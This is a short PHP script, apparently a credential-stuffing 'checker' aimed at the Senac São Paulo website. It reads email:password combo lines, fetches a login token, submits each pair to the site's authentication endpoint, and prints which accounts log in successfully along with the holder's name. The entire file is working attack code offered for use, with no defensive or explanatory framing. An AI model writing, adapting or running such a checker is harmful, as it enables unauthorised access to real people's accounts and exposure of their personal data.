<?php
require_once 'roquest.php';

$checker = new roquest();

$lista = "email@email.com:password";
$conta = $checker->separarLista(array(':','|'),$lista);

$email = $conta[0];
$senha = $conta[1];

$url = "https://www.sp.senac.br/o/senac-content-services/geraTokenLogin";
$url_2 = "https://www.sp.senac.br/o/senac-content-services/autenticacaoLogin";

$headers = array(
'Accept: */*',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Connection: keep-alive',
);

$headers_2 = array(
    'Connection: keep-alive',
    'Content-Type: text/plain',
);


$r1 = $checker->requisiçaoGet($url,$headers,'cookie1','','');
$token = $checker->puxarDados($r1,'"token":"','"','1');

$data_2 = '{"email":"'.$email.'","senha":"'.$senha.'","token":"'.$token.'"}';

$r2 = $checker->requisiçaoPost($url_2,$headers_2,$data_2,'cookie1','','');

$validar = $checker->validarConta($r2,'"nome":"','incorreto(s)!');
$nome = $checker->puxarDados($r2,'"nome":"','"','1');

if($validar == 1){
    echo "OK! $email:$senha -> $nome";
}
if($validar == 0){
    echo "ERROR! $email:$senha -> Usuário ou senha incorretos";
}